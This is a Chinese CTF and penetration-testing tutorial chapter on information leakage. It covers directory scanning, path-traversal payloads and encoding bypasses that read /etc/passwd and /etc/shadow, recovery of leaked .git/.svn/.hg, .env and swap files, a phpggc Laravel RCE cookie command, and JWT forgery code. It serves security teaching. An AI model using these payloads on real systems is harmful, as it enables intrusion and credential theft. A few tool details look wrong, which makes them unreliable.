# 1. 信息泄露

信息泄露是渗透测试的第一步——从目录扫描、备份文件、版本控制泄露中找到源码、配置和密钥，为后续攻击铺路。

---

## 1.1 常见敏感目录

### 场景

很多网站在部署时会遗留下不该公开访问的目录或文件——比如管理员忘了删掉测试页面、版本控制目录被打包上传、配置文件被放在 web 目录下。攻击者只需要一个浏览器或一个扫描器，就能把这些"被遗忘的秘密"翻个底朝天。

### 原理

网站服务器默认会暴露 Web 根目录下所有可读的文件和目录。除非 Nginx/Apache 显式配置了拦截规则（如 `location ~ /\.`），否则任何放在 `/var/www/html` 下的文件都可通过 URL 直接访问。

| 常见遗留物 | 泄露内容 | 风险等级 |
|-----------|---------|---------|
| 测试页面 | 路径、参数、数据库连接方式 | 中 |
| 版本控制目录 | 完整源码、提交历史、配置文件 | 极高 |
| 配置文件 | 数据库密码、API密钥、密钥 | 极高 |
| 备份文件 | 整站源码 | 高 |
| 日志文件 | 用户数据、调试信息 | 中 |

### 实战：手动探测高价值路径

不需要上来就扫全量字典，先手动试几个高价值路径，往往一击即中：

```
/robots.txt          # 爬虫协议，直接告诉你哪些目录不想被搜到（恰好说明那里有东西）
/.git/HEAD           # Git 仓库泄露（详见 3.4 节）
/.svn/entries        # SVN 仓库泄露
/.env                # Laravel/PHP 环境变量，可能含数据库密码和密钥
/phpinfo.php         # PHP 信息页，泄露服务器路径和配置
/console             # Werkzeug 调试控制台（Flask debug 模式）
/actuator            # Spring Boot 监控端点，可能泄露路由和配置
/admin               # 管理后台入口
/backup              # 备份目录
/phpmyadmin          # 数据库管理工具
/www.zip             # 整站源码打包
/www.tar.gz          # 同上
/source.zip          # 源码压缩包
/docker-compose.yml  # Docker 编排文件，泄露服务拓扑
/api-docs            # Swagger API 文档，泄露所有接口
/.well-known/        # 安全相关配置（如 security.txt）
```

### 目录扫描工具速查

手工试完高价值路径后，再用工具跑字典做全面扫描。

| 工具 | 语言 | 特点 | 推荐场景 |
|------|------|------|---------|
| dirsearch | Python | 带颜色输出，支持后缀枚举 | CTF 通用首选 |
| gobuster | Go | 速度快，支持多线程 | 大字典扫描 |
| dirb | C | Kali 自带，无需安装 | 快速检测 |
| ffuf | Go | 性能最强，支持模糊测试 | 超大规模字典 |
| feroxbuster | Rust | 支持递归、过滤状态码 | 深度扫描 |

**基本用法：**

```bash
# dirsearch（最常用，带颜色输出）
python dirsearch.py -u http://target.com -e php,html,txt,zip,bak

# gobuster（Go 写的，速度快）
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# dirb（老牌工具，Kali 自带）
dirb http://target.com

# ffuf（性能最强，适合大字典）
ffuf -u http://target.com/FUZZ -w wordlist.txt

# feroxbuster（Rust 递归扫描）
feroxbuster -u http://target.com -w wordlist.txt --auto-batis
```

### 扫描结果解读表

拿到扫描结果后，需要快速判断每个路径的真实意义：

| 状态码 | 含义 | 行动建议 |
|--------|------|---------|
| `200 OK` | 路径存在且可访问 | 直接浏览器打开看内容 |
| `403 Forbidden` | 权限拒绝或 WAF 拦截 | 先与随机不存在路径的响应做对照；尝试路径穿越或方法篡改 |
| `301/302` | 重定向 | 跟到 `Location` 头部；检查跳转前响应体 |
| `401 Unauthorized` | 需要 HTTP 认证 | 尝试弱口令，或检查 `WWW-Authenticate` 头部 |
| `404 Not Found` | 路径不存在或自定义 404 | 排除 Soft 404 的情况（见下方） |
| `500 Internal Server Error` | 服务器内部错误 | 可能触发了报错信息泄露 |
| `204 No Content` | 存在但无内容 | 常用于 API 端点 |

>**新手避坑：** 同一个框架的 404 页面长度通常一致。如果某个 `200` 返回的页面长度明显与众不同，大概率有东西。另外注意响应时间——如果某个路径比其他路径返回明显更慢，可能是进入了耗时操作（数据库查询等），值得进一步分析。

**Soft 404 识别方法：**

有些网站对所有不存在路径都返回 `200` 但显示"页面不存在"，这叫 Soft 404。判断方法：

1. 访问一个绝对不存在的路径（如 `/thiscouldnotpossiblyexist12345.html`）
2. 记录其响应长度和内容特征
3. 与扫描结果中的 `200` 路径一一对比
4. 长度相同 → 很可能是 Soft 404，排除

### 360度检查清单

| 检查项 | 路径示例 | 优先级 |
|--------|---------|--------|
| 爬虫协议 | `/robots.txt`, `/sitemap.xml` | ★★★★★ |
| 版本控制 | `/.git/HEAD`, `/.svn/entries`, `/.hg/requires` | ★★★★★ |
| 环境变量 | `/.env`, `/.env.local`, `/application.properties` | ★★★★★ |
| 备份压缩包 | `/www.zip`, `/web.tar.gz`, `/backup.rar` | ★★★★☆ |
| 管理后台 | `/admin`, `/login`, `/dashboard` | ★★★★☆ |
| 调试端点 | `/actuator`, `/console`, `/debug` | ★★★★☆ |
| API 文档 | `/api-docs`, `/swagger-ui.html`, `/openapi.json` | ★★★☆☆ |
| 配置文件 | `/config.php`, `/config.json`, `/settings.yml` | ★★★☆☆ |
| 日志文件 | `/access.log`, `/error.log`, `/debug.log` | ★★★☆☆ |
| 临时文件 | `/phpinfo.php`, `/info.php`, `/test.php` | ★★★☆☆ |

## 1.2 目录穿越

### 场景

网站通过参数接收一个文件路径，然后读取文件内容显示出来。比如在线文档查看器、模板渲染、图片读取等功能。如果后端没有对 `../` 做过滤，你就可以跳出网站目录，读到服务器上的任意文件。

### 原理

目录穿越（Path Traversal）的核心是路径拼接信任用户输入：

```php
//  漏洞写法：开发者本意是限制在 /var/www/html/ 下
$file = $_GET['file'];
include("/var/www/html/" . $file);

//  安全写法：过滤 ../ 或使用 basename()
$file = basename($_GET['file']);
include("/var/www/html/" . $file);
```

如果传入 `?file=../../../etc/passwd`，实际路径拼接为 `/var/www/html/../../../etc/passwd` → 等价于 `/etc/passwd`。

### 实战：发现漏洞点

URL 里看到这类参数就要立刻警觉：

| 参数名 | 常见位置 | 备注 |
|--------|---------|------|
| `?file=xxx` | 文件包含、下载 | 最常见 |
| `?path=xxx` | 路径处理 | 次常见 |
| `?page=xxx` | CMS 页面选择 | |
| `?template=xxx` | 模板渲染 | 可能还涉及 SSTI |
| `?load=xxx` | 加载器 | |
| `?include=xxx` | PHP 文件包含 | 可能含 LFI/RFI |
| `?dir=xxx` | 目录列表 | |
| `?folder=xxx` | 文件夹选择 | |
| `?document=xxx` | 文档查看 | |
| `?read=xxx` | 文件读取 | |

同理 POST 请求体或 Cookie 值里出现文件名也值得尝试。

### 实战：基础 Payload

```bash
# Linux 目标
../../../etc/passwd
../../../../../../etc/passwd    # 多写几层，确保回到根目录

# Windows 目标
..\..\..\windows\win.ini
../../../../windows/win.ini      # Windows 也认 /
../../../../windows/system32/drivers/etc/hosts
```

### 实战：常见过滤绕过方法表

| 绕过方式 | Payload | 原理 |
|---------|---------|------|
| URL 编码 | `%2e%2e%2f%2e%2e%2fetc/passwd` | 后端只拦 `../` 原文，不解码后再检查 |
| 部分 URL 编码 | `..%2f..%2f..%2fetc/passwd` | 只编码斜杠，点号保留 |
| 二次 URL 编码 | `%252e%252e%252fetc/passwd` | 后端解码一次后过滤，再解码一次才拼路径 |
| 双写绕过 | `....//....//....//etc/passwd` | 后端把 `../` 替换为空，但只替换一次 |
| 绝对路径 | `/etc/passwd` | 后端只在前面拼接路径，直接给 `/` 开头绕过了 |
| Windows 双斜杠 | `....\\....\\....\\etc/passwd` | Windows 同时认 `/` 和 `\` |
| Unicode 编码 | `%c0%ae%c0%ae%c0%af` | 宽字节字符被解释为 `.` 和 `/` |
| Base64 编码参数 | 参数值整体 Base64 | 后端解码后才拼路径 |
| 嵌套路径 | `....//....//....//....//etc/passwd` | 绕过简单的 `../` 替换 |

>**新手避坑：** 不要认为只试了一次 404 就不存在漏洞。尝试所有绕过方式！很多 CTF 题目的目录穿越过关点就藏在二次编码或双写之中。

### CTF 中值得读的目标文件

| 文件 | 价值 | 适用平台 |
|------|------|---------|
| `/etc/passwd` | 验证漏洞存在，列出系统用户 | Linux |
| `/etc/shadow` | 用户密码哈希（需要 root） | Linux |
| `/proc/self/environ` | 环境变量，可能含密钥 | Linux |
| `/proc/self/cmdline` | 当前进程的启动命令 | Linux |
| `/proc/self/fd/N` | 访问已打开的文件描述符 | Linux |
| `/proc/1/cgroup` | 判断是否在容器里 | Linux |
| `/flag` | CTF 最常见 flag 位置 | Linux |
| `/flag.txt` | CTF flag 变体 | Linux |
| `WEB-INF/web.xml` | Java Web 应用配置，泄露路由和数据库信息 | Java |
| `.htaccess` | Apache 目录配置 | Linux |
| `config.php` / `database.php` | PHP 数据库配置 | Linux |
| `app.py` / `app.config` | Python/Flask 源码或配置 | Linux |
| `C:\Windows\System32\drivers\etc\hosts` | Windows hosts 文件 | Windows |
| `C:\flag.txt` | Windows CTF flag | Windows |
| `C:\inetpub\wwwroot\web.config` | IIS 配置文件 | Windows |

### 判断是否存在漏洞

```
场景：访问 ?file=../../../etc/passwd
结果 A：页面显示 "root:x:0:0:root:/root:/bin/bash"  → 漏洞存在
结果 B：页面显示 "file not found"                   → 可能是路径不对或过滤了
结果 C：页面显示报错 "Warning: include(): Failed opening" → 路径不对但暴露了真实路径
```

即使没读到目标文件，报错信息里暴露了服务器真实路径（如 `/var/www/html/`），也算有效信息。

>**新手避坑：** 报错信息泄露是信息收集的黄金线索——PHP 报错会告诉你 `include(/var/www/html/../etc/passwd)` 的完整路径，Java 报错会暴露 `C:\Tomcat\webapps\`。看到报错别慌，先截图保存。

## 1.3 备份文件常见后缀

### 场景

开发者修改代码前通常会先复制一份作为备份（如 `index.php` → `index.php.bak`），或使用编辑器远程修改文件时产生交换文件（如 Vim 的 `.swp`、Emacs 的 `~` 后缀）。如果这些文件没有被清理，并在部署上线时一并被打包上传到了服务器，攻击者直接访问即可下载到源码。

### 原理

Web 服务器默认按文件名提供服务，不检查文件是不是"备份"——只要 URL 路径能匹配到文件系统上的文件，就会返回内容。而 `.bak`、`.old`、`.swp` 这类后缀关联的 mime 类型通常是纯文本，浏览器会直接显示源码。

### 实战：备份后缀大全

知道目标文件名后（比如 `index.php`），挨个试后缀：

**编辑器交换文件：**

| 后缀 | 编辑器 | 恢复方法 |
|------|--------|---------|
| `.index.php.swp` | Vim 第一实例 | `vim -r .index.php.swp` |
| `.index.php.swo` | Vim 第二实例 | `vim -r .index.php.swo` |
| `.index.php.swn` | Vim 第三实例 | `vim -r .index.php.swn` |
| `.index.php~` | 某些编辑器末尾波浪号 | 直接 cat |
| `.#index.php` | Emacs 锁文件 | 直接 cat |
| `index.php~` | Emacs 自动备份 | 直接 cat |
| `%index.php%` | Windows 编辑器临时文件 | 直接 cat |

**常见备份后缀：**

| 后缀 | 常见性 | 说明 |
|------|--------|------|
| `.bak` | ★★★★★ | 最常见的备份后缀 |
| `.old` | ★★★★☆ | 老旧版本 |
| `.backup` | ★★★☆☆ | 全称备份 |
| `.bk` | ★★★☆☆ | 简写备份 |
| `.bkp` | ★★★☆☆ | 另一种简写 |
| `.save` | ★★★☆☆ | 编辑器保存 |
| `.orig` | ★★★☆☆ | 原始版本 |
| `.txt` | ★★★☆☆ | 另存为文本 |
| `.copy` | ★★☆☆☆ | 复制品 |
| `.tmp` | ★★☆☆☆ | 临时文件 |
| `_old` | ★★☆☆☆ | 以旧版本结尾 |

### 整站源码包

开发者打包整个网站做备份，然后忘了删：

| 文件名 | 后缀 | 常见性 |
|--------|------|--------|
| `www` | .zip / .tar.gz / .rar / .7z | ★★★★★ |
| `web` | .zip / .tar.gz / .rar | ★★★★☆ |
| `backup` | .zip / .tar.gz / .rar | ★★★★★ |
| `site` | .zip / .tar.gz | ★★★☆☆ |
| `source` | .zip / .tar.gz | ★★★★☆ |
| `code` | .zip / .tar.gz | ★★★☆☆ |
| `wwwroot` | .zip / .tar.gz | ★★★☆☆ |
| `htdocs` | .zip / .tar.gz | ★★☆☆☆ |
| `html` | .zip / .tar.gz | ★★☆☆☆ |
| `1` | .zip / .rar | ★★☆☆☆ |
| `project` | .zip / .tar.gz | ★★★☆☆ |
| `app` | .zip / .tar.gz | ★★★☆☆ |

### 数据库 dump 文件

| 文件名 | 后缀 | 说明 |
|--------|------|------|
| `db` | .sql / .sql.gz | 数据库导出 |
| `database` | .sql / .sql.gz | 整库备份 |
| `backup` | .sql / .sql.gz | 备份导出 |
| `dump` | .sql / .sql.gz | 数据转储 |
| `data` | .sql / .sql.gz | 数据导出 |
| `export` | .sql / .sql.gz | 导出备份 |
| `mydb` | .sql / .sql.gz | 自定义名称 |
| `init` | .sql | 初始化脚本 |

### 实战：扫描方法

```bash
# dirsearch 扫备份后缀
python dirsearch.py -u http://target.com -e bak,old,backup,swp,txt,zip,tar.gz,rar,sql,~

# gobuster 指定后缀
gobuster dir -u http://target.com -x bak,old,backup,zip,tar.gz,sql -w wordlist.txt

# ffuf 模糊测试后缀
ffuf -u http://target.com/index.phpFUZZ -w suffix.txt

# 手动快速检测（已知文件名时）
curl -s -o /dev/null -w "%{http_code}" http://target.com/index.php.bak
curl -s -o /dev/null -w "%{http_code}" http://target.com/index.php.old
curl -s -o /dev/null -w "%{http_code}" http://target.com/.index.php.swp
```

>**新手避坑：** 如果已经知道目标文件名，手动在浏览器拼后缀比扫描工具更快——CTF 里经常 `index.php.bak` 一下就直接拿到源码。另外注意，不是所有备份文件都有后缀——有时开发者把 `index.php` 复制为 `index_old.php`，这也值得一试。

## 1.4 DVCS 泄露

### 场景

开发者在部署代码时，把整个项目目录（包含 `.git`、`.svn` 等版本控制目录）一并上传到了服务器。这些目录里有完整的代码历史记录，攻击者访问到就能还原出全部源码——包括曾经写过的配置文件、测试用的密钥、被删掉又重新提交的 flag。

### 原理

版本控制系统会在项目目录下创建隐藏文件夹（`.git`、`.svn`、`.hg`），存储所有文件的版本历史和元数据。默认情况下 Nginx/Apache 不会拦截以点开头的路径访问，只要 Web 服务器配置没有显式拒绝 `/.git`，攻击者就能通过 HTTP 请求逐个拉取这些文件。

### 实战：.git 泄露（最常见）

先确认是否存在：浏览器访问 `http://target.com/.git/HEAD`，如果返回 `ref: refs/heads/master` 或 `ref: refs/heads/main` 就说明 `.git` 目录可访问。

**工具速查表：**

| 工具 | 安装 | 命令 | 特点 |
|------|------|------|------|
| GitHack | `git clone https://github.com/lijiejie/GitHack` | `python GitHack.py http://target/.git/` | 最常用，Python 脚本 |
| git-dumper | `pip install git-dumper` | `git-dumper http://target/.git/ output/` | 更稳定，直接重建仓库 |
| GitTools | `git clone https://github.com/internetwache/GitTools` | `bash gitdumper.sh http://target/.git/ output_dir` | 三件套功能全面 |
| dvcs-ripper | `git clone https://github.com/kost/dvcs-ripper` | `perl rip-git.pl -v -u http://target/.git/` | 支持多种 VCS |

```bash
# GitHack（Python 脚本，最常用）
python GitHack.py http://target.com/.git/

# git-dumper（更稳定，直接重建 git 仓库）
git-dumper http://target.com/.git/ output_dir/

# GitTools 三件套
bash gitdumper.sh http://target.com/.git/ output_dir
cd output_dir
git log --oneline                    # 查看提交历史
git diff HEAD~1                      # 查看最近一次改了什么
git checkout -- .                    # 恢复所有文件
```

**拉下来后做什么：**

```bash
# 1. 查看提交历史
git log --oneline --all
# 输出示例：
# abc1234 Fixed password in config
# def5678 Added config file
# ghi9012 Initial commit

# 2. 查看每次改了什么
git show abc1234                     # 看某次提交的详细改动
git diff def5678..abc1234            # 比较两次提交

# 3. 搜索所有提交中的 flag
git grep flag $(git rev-list --all)

# 4. 查看所有分支
git branch -a
git checkout other-branch
```

**特殊情况处理：**

| 情况 | 处理方法 |
|------|---------|
| 目录列不出来但文件能访问 | 工具一般能自动处理，逐个请求已知文件名拉取 |
| `.git/index` 不可读 | 尝试用 GitHack 的 `--index` 参数或 git-dumper |
| 只有 `.git/objects/` 可读 | 用 `git cat-file -p` 挨个解析 object |
| 部分文件 403 | 尝试修改 User-Agent 或添加 `?` 参数 |
| 文件名被混淆 | 使用 `git fsck` 恢复丢失的对象 |

### 实战：.svn 泄露

Subversion（SVN）是集中式版本控制系统，会在项目每个目录下生成一个 `.svn` 隐藏文件夹。

**常见泄露文件：**

| 文件路径 | 版本 | 说明 |
|---------|------|------|
| `/.svn/entries` | SVN 1.6 及之前 | 记录目录结构和文件列表 |
| `/.svn/wc.db` | SVN 1.7+ | SQLite 数据库存储所有信息 |
| `/.svn/pristine/` | SVN 1.7+ | 按校验和保存文件原始内容 |
| `/.svn/text-base/` | 老版本 | 源代码文件的原始副本 |

**利用方法：**

```bash
# dvcs-ripper（一键拉取）
perl rip-svn.pl -v -u http://target/.svn/

# svn-extractor（Python 工具）
python svn_extractor.py http://target/

# 手动下载 wc.db 后查询
curl -O http://target/.svn/wc.db
sqlite3 wc.db ".tables"
sqlite3 wc.db "SELECT * FROM NODES;"
sqlite3 wc.db "SELECT local_path, checksum FROM NODES;"
```

### 实战：.hg 泄露

Mercurial（hg）是分布式版本控制系统，在项目根目录下生成 `.hg` 隐藏文件夹。

**常见泄露文件：**

| 文件路径 | 说明 |
|---------|------|
| `/.hg/requires` | 仓库配置要求，访问它确认泄露存在 |
| `/.hg/dirstate` | 工作目录状态，记录文件和节点 ID |
| `/.hg/store/` | 存储所有版本的历史数据 |
| `/.hg/branch` | 当前分支名 |
| `/.hg/00changelog.i` | 变更日志索引 |

**利用方法：**

```bash
# dvcs-ripper
perl rip-hg.pl -v -u http://target/.hg/

# hg-extractor（Python 脚本）
python hg_extractor.py http://target/.hg/

# 如果目标配置了 hg 服务
hg clone http://target/repository repo_copy
```

>**新手避坑：** 普通静态文件泄露并不等于服务器提供 Mercurial HTTP 仓库协议，所以通常不能直接对 `/.hg/` 执行 `hg clone`。应先用泄露恢复工具下载完整 `.hg` 元数据，再在本地工作副本中运行 `hg` 命令。只有目标确实配置了 Mercurial HTTP 服务时，远程 `hg clone` 才成立。

### 通用检查步骤

| 步骤 | 操作 | 预期结果 |
|------|------|---------|
| 1 | 访问 `/.git/HEAD` | 返回 `ref: refs/heads/master` |
| 2 | 访问 `/.svn/entries` | 返回 XML 或纯文本文件列表 |
| 3 | 访问 `/.hg/requires` | 返回版本需求信息 |
| 4 | 确认存在后用对应工具拉取 | 拿到完整或部分源码 |
| 5 | 分析目录权限完整性 | 检查是否缺 index / objects |
| 6 | 针对性处理不完整的情况 | 手工补齐或用进阶命令 |

## 1.5 Vim 泄露

### 场景

Vim 在编辑文件时会自动创建一个交换文件（swap file），用于崩溃恢复和防止多实例冲突。如果编辑器异常退出（SSH 断开、终端崩溃），这个交换文件就会残留在目录里。

### 原理

交换文件名为 `.原文件名.swp`，前面带点号所以 `ls` 默认看不到，但 web 服务器通常不拦截这类文件。交换文件里面包含了编辑时的缓冲区内容——包括尚未保存的代码、注释、甚至临时输入的密码。

### 实战：命名规则

| 实例 | 文件名 | 说明 |
|------|--------|------|
| 第一次编辑 | `.index.php.swp` | 第一个 Vim 实例 |
| 第二次编辑 | `.index.php.swo` | 第二个 Vim 实例（同时编辑同一文件） |
| 第三次编辑 | `.index.php.swn` | 第三个实例 |
| 第四次编辑 | `.index.php.swm` | 第四个 |
| 第五次编辑 | `.index.php.swl` | 第五个 |
| 后续 | `.index.php.swk` / `.swj` / ... | 字母逆序排列 |

### 实战：利用步骤

**第一步：发现交换文件**

```
http://target.com/.index.php.swp
http://target.com/.index.php.swo
http://target.com/.index.php.swn
http://target.com/.admin.php.swp
http://target.com/.config.php.swp
```

**第二步：下载并恢复**

```bash
# 方法1：用 Vim 恢复（最完整）
vim -r .index.php.swp
# Vim 会显示交换文件中的内容，按 :q 退出后用 :w newfile 保存

# 方法2：用 strings 提取文本（不需要 Vim）
strings .index.php.swp | head -200
strings .index.php.swp | grep -i "flag\|password\|secret"

# 方法3：用 cat -v 查看特殊字符
cat -v .index.php.swp
```

>**新手避坑：** 很多 CTF 选手下载了 `.swp` 直接用编辑器打开，结果全是乱码。记住两条路：有 Vim 用 `vim -r` 恢复，没有 Vim 用 `strings` 提取可读文本。大多数场景下 `strings` 就够了——flag 一般以明文形式出现在交换文件的字符串中。

### Vim 与 Emacs 对比

| 编辑器 | 交换文件/备份文件 | 恢复方法 |
|--------|-----------------|---------|
| Vim | `.filename.swp`, `.swo`, `.swn` | `vim -r .filename.swp` |
| Vim（备份文件） | `filename~`（需设置 backup 选项） | 直接 `cat filename~` |
| Emacs | `#filename#`（自动保存） | 打开后恢复 |
| Emacs（备份文件） | `filename~` | 直接 `cat filename~` |
| Emacs（锁文件） | `.#filename` | 直接 `cat` 查看进程信息 |

## 1.6 macOS `.DS_Store` 泄露

### 场景

`.DS_Store`（Desktop Services Store）是 macOS 系统在每个文件夹里自动生成的隐藏文件，用来保存文件夹的显示设置（图标位置、排序方式等）。如果开发者在 macOS 上创建了项目，部署时把这个文件一并上传到了服务器，攻击者下载后就能拿到完整的目录结构。

### 原理

虽然 `.DS_Store` 是二进制格式，但里面通过 Apple 的专有格式记录了该目录下**所有文件和子目录的名称**。这些文件名列表可以直接读取出来，帮助攻击者发现非公开的路径。

### 实战：利用步骤

```bash
# 第一步：下载 .DS_Store
curl -O http://target/.DS_Store

# 第二步：用 Python 解析（最准确）
pip install ds_store
python3 -c "
import ds_store
ds = ds_store.DSStore.open('.DS_Store')
for f in ds:
    print(f.filename)
"

# 第三步：或者直接用 strings（速度快，不需要装库）
strings .DS_Store | sort -u | head -50
strings .DS_Store | grep -v "^\." | sort -u
```

### Python 解析脚本

```python
import ds_store
import sys

def list_ds_store(filename):
    """列出 .DS_Store 中的所有文件名"""
    try:
        ds = ds_store.DSStore.open(filename)
        files = []
        for item in ds:
            files.append(item.filename)
        return sorted(set(files))
    except Exception as e:
        print(f"[-] 解析失败: {e}")
        return []

if __name__ == "__main__":
    for f in list_ds_store(".DS_Store"):
        print(f)
```

>**新手避坑：** 不需要在一开始就安装 ds_store 库——先用 `strings .DS_Store | head -50` 看一遍，大部分文件名会直接以明文形式出现。如果 strings 提取的内容太少或包含大量乱码，再用 Python 库做精确解析。

## 1.7 .env 泄露

### 场景

`.env` 文件是现代 Web 开发中最常见的环境变量配置文件。很多框架（Laravel、Symfony、ThinkPHP、Next.js 等）都使用 `.env` 来存放数据库密码、密钥、API Token 等敏感配置。理论上 `.env` 应该放在网站根目录之外，或者由 Web 服务器拦截对 `.env` 的访问。但实际部署中经常出现各种配置失误。

### 原理

框架在启动时会读取 `.env` 文件中的键值对，注入到环境变量中。这个文件本身是纯文本格式，只要 Web 服务器没有配置拒绝规则，直接访问 `/.env` 就能下载完整的内容。

### 实战：为什么 .env 会暴露

| 失误场景 | 说明 |
|---------|------|
| 项目根目录直接作为 Web 根目录 | 开发者的 `.env` 就在 `/var/www/html/` 下 |
| 未配置隐藏文件拦截 | Nginx 缺少 `location ~ /\.` 规则 |
| Docker 部署不规范 | `COPY . /app` 直接把 `.env` 放进镜像 |
| 备份导致暴露 | 把 `.env.bak` 一起打包上传 |
| 反向代理配置错误 | 路由规则没覆盖隐藏文件 |
| 服务器只拦截 PHP 后缀 | `.env` 没有后缀，直接被当文本返回 |

### 实战：怎么判断存在 .env 泄露

直接访问 `http://target.com/.env`，如果返回内容里出现类似下面的键值对，说明泄露了：

```ini
APP_NAME=MyApp
APP_ENV=local
APP_KEY=base64:xxxxxxxxxxxx=
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=mydb
DB_USERNAME=root
DB_PASSWORD=secret123
```

### 如果被拦截，尝试变体

| 变体路径 | 说明 |
|---------|------|
| `/.env` | 标准路径 |
| `/.env.local` | 本地覆盖配置 |
| `/.env.production` | 生产环境配置 |
| `/.env.development` | 开发环境配置 |
| `/.env.backup` | 备份 |
| `/.env.bak` | 备份后缀 |
| `/.env.dev` | 开发环境 |
| `/.env.example` | 示例配置（确认框架类型） |
| `/.env.old` | 旧版本 |
| `/.env.save` | 保存副本 |
| `/.env~` | 编辑器残留 |
| `/.env.swp` | Vim 交换文件 |
| `/env` | 无点号变体 |
| `/env.txt` | 文本后缀 |
| `/app.env` | 应用配置 |
| `/config/.env` | 配置目录 |
| `/laravel/.env` | 框架目录 |
| `/backend/.env` | 后端目录 |
| `/api/.env` | API 目录 |

### 完整利用链：拿到 .env 后重点看什么

| 配置项 | 泄露价值 | 后续利用 |
|--------|---------|---------|
| `APP_KEY` | Laravel 应用密钥 | 伪造 Cookie/Session、解密加密数据 |
| `DB_PASSWORD` / `DB_USERNAME` / `DB_HOST` | 数据库连接信息 | 远程连接数据库、读取/修改数据 |
| `DB_PORT` | 数据库端口 | 确认服务开放端口 |
| `REDIS_PASSWORD` | Redis 密码 | 配合 SSRF 写 Webshell |
| `JWT_SECRET` / `JWT_KEY` | JWT 签名密钥 | 伪造任意用户 Token |
| `SECRET_KEY` / `SECRET` | 通用密钥（Flask/Django） | Session 伪造 |
| `MAIL_PASSWORD` / `MAIL_USERNAME` | 邮件账号密码 | 登录邮件系统 |
| `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` | 云服务凭证 | 接管云资源 |
| `API_KEY` / `API_TOKEN` | 第三方 API 密钥 | 调用付费接口 |
| `ENCRYPTION_KEY` | 加密密钥 | 解密数据库加密字段 |
| `ADMIN_PASSWORD` | 管理员密码 | 直接登录后台 |
| `STRIPE_SECRET` | 支付密钥 | 操作支付系统 |
| `OAUTH_CLIENT_SECRET` | OAuth 客户端密钥 | 冒充应用身份 |
| `SALT` | 密码盐值 | 破解密码哈希 |

### 利用链一：APP_KEY -> Cookie 伪造

Laravel 的 `APP_KEY` 用于加密 Cookie 和 Session。有了 `APP_KEY`，就可以：

1.**解密目标发来的 Cookie**，读取其中的 Session 数据
2.**伪造任意 Cookie**，包括管理员身份的 Session
3.**解密加密数据**：如果应用使用了 `encrypt()` / `decrypt()`

```bash
# 安装 phpggc（Laravel 反序列化 + APP_KEY 利用）
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# 用 APP_KEY 生成 Laravel 反序列化 payload Cookie
php -d'phar.readonly=0' phpggc Laravel/RCE1 system 'cat /flag' -b "base64:xxxxxxxxx="

# 测试 Cookie
curl -b "laravel_session=伪造的Cookie值" http://target/admin
```

### 利用链二：DB_PASSWORD -> 远程连接

如果数据库端口对外开放：

```bash
# MySQL（默认 3306）
mysql -h target.com -u root -p'password_from_env' -e "SHOW DATABASES;"
mysql -h target.com -u root -p'password_from_env' -D target_db -e "SELECT * FROM flags;"

# PostgreSQL（默认 5432）
psql -h target.com -U postgres -W'password_from_env' -c "\l"

# Redis（默认 6379）
redis-cli -h target.com -a 'password_from_env' KEYS '*'
redis-cli -h target.com -a 'password_from_env' GET flag

# MongoDB（默认 27017）
mongosh "mongodb://user:password@target.com:27017/admin"
```

即使数据库端口不对外开放，拿到了数据库密码也能：

- 结合 SQL 注入漏洞利用
- 登录数据库管理后台（如 phpMyAdmin、Adminer）
- 用于密码重用攻击（尝试用相同密码登录 SSH/邮箱）

### 利用链三：JWT_SECRET -> Token 伪造

```python
import jwt

# 从 .env 中拿到的 JWT_SECRET
secret = "your_jwt_secret_here"

# 伪造管理员 Token
payload = {
    "user_id": 1,
    "username": "admin",
    "role": "admin",
    "iat": 1625097600
}
token = jwt.encode(payload, secret, algorithm="HS256")
print(f"JWT: {token}")

# 使用伪造的 Token
# Authorization: Bearer <token>
```

## 1.8 二进制文件查看技巧

### 场景

CTF 中下载到的源码包、数据库文件、临时文件往往不是纯文本格式，不能直接用编辑器打开。需要掌握几个快速提取信息的方法。

### 原理

不同文件格式有不同的二进制结构。纯文本编辑器遇到非 UTF-8 字符时会显示乱码，但通过专门的工具可以快速提取可读信息或识别文件类型。

### 实战工具表

| 工具 | 用途 | 常用场景 |
|------|------|---------|
| `strings` | 提取可读文本 | 查看任何二进制文件里的字符串 |
| `file` | 识别文件类型 | 未知后缀的文件 |
| `xxd` | 十六进制查看 | 检查文件头、手动识别格式 |
| `hexdump` | 十六进制查看 | xxd 的替代品 |
| `binwalk` | 识别嵌套文件 | 固件分析、隐写分析 |
| `exiftool` | 查看文件元数据 | 图片/文档的隐藏信息 |
| `binwalk -e` | 自动提取 | 提取固件中的文件系统 |

### 实战：strings —— 提取可读文本（最常用）

任何二进制文件里埋藏的字符串都能被 `strings` 拉出来，是 CTF 里面对未知文件的第一个动作：

```bash
strings 文件名 | head -100          # 看前 100 行
strings 文件名 | grep -i flag       # 直接搜 flag
strings 文件名 | grep -i "password\|secret\|key"  # 搜密钥
strings -n 8 文件名                  # 只显示长度 ≥8 的字符串（过滤短噪音）
```

### 实战：file —— 识别文件类型

下载了一个没有后缀的文件，先用 `file` 判断它到底是什么：

```bash
file 未知文件
# 输出示例：
# SQLite 3.x database
# Zip archive data
# ELF 64-bit executable
# JPEG image data
# PNG image data
# gzip compressed data
# ASCII text
```

### 实战：xxd / hexdump —— 查看十六进制原始数据

```bash
xxd 文件名 | head -50               # 十六进制 + ASCII 对照
hexdump -C 文件名 | head -50        # 同上，另一种风格
```

**常见文件头速查表：**

| 十六进制开头 | ASCII 标识 | 文件格式 |
|-------------|-----------|---------|
| `50 4B 03 04` | `PK..` | ZIP 压缩包 |
| `50 4B 05 06` | `PK..` | ZIP 空归档 |
| `1F 8B 08` | `....` | GZIP 压缩 |
| `89 50 4E 47` | `.PNG` | PNG 图片 |
| `FF D8 FF` | `....` | JPEG 图片 |
| `25 50 44 46` | `%PDF` | PDF 文档 |
| `7F 45 4C 46` | `.ELF` | ELF 可执行文件 |
| `23 21` | `#!` | Shell 脚本 |
| `3C 3F 78 6D` | `<?xm` | XML 文件 |
| `00 00 00 00 00 00 00 00` | `........` | SQLite 数据库（前 16 字节为空） |
| `42 5A 68` | `BZh` | BZIP2 压缩 |
| `52 61 72 21` | `Rar!` | RAR 压缩 |
| `37 7A BC AF 27 1C` | `7z..'.` | 7z 压缩 |
| `49 49 2A 00` | `II*.` | TIFF 图片 |

### 实战：binwalk —— 识别嵌套文件

有些文件是"套娃"结构（比如固件里塞了压缩包，图片里藏了 zip），用 binwalk 自动发现：

```bash
